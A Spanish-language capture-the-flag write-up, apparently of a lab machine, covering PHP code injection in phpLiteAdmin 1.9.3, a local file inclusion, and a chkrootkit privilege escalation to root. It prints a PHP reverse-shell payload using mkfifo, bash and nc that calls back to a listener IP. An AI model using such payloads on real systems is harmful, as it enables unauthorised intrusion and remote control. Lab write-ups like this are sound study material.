...
La pagina que corre en el puerto `80` no muestra nada de nada, solo un mensaje, y nada de información en el código fuente.
...
Al parecer hay un poc para obtener Inyección de comandos `PHP`, en la version `1.9.3`, pero podria analizar de que se trata.
...
Y ademas a la base de datos la tengo q nombrar como `ninevehNotes.php` ya que la inyección es de código `php`.

![image-center](/assets/images/{68609162-4F85-4747-BA2C-B522B950F053}.png)

Ahora aprovechándome el `LFI` sabiendo que estoy en la ruta `/var/www/department/` tengo que retroceder 2 directorios para poder ver el archivo que cree, ya que como puedo ver se creo en la ruta `/var/tmp`.
...
Y como tengo inyección de comando puedo usar el siguiente `payload`.

```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.17.19 4444 >/tmp/f"); ?>
```

Así que creo una nueva tabla .

![image-center](/assets/images/{19F73634-0B1E-4F45-88DE-A60D9BBA7CA6}.png)

Y coloco ese valor, para después acceder al archivo desde el `LFI`.
## Shell as amrois
...
Así que decidí subir `pspy` para monitorear procesos en tiempo real y es así como veo muchos procesos de un binario llamado `chrootkit`.
...
Es algo raro, así que puedo buscar por `exploits` en la misma base de datos que busque al inicio.
...
Al parecer como dice en el mismo script la vulnerabilidad reside en la función `slapper()` del binario de `chrootkit`.
...
Es así como en el mismo `poc` me dice que el binario busca los archivos como `/tmp/update/` entre otros, siendo así este el que yo voy a crear con el siguiente contenido.
...
Y le doy permisos de ejecución, para así lograr la explotación.

```bash
chmod +x update
```

Y si espero unos segundos, ya que es un proceso que esta constantemente en ejecución, desde mi listener `nc` recibo la shell como `root`.
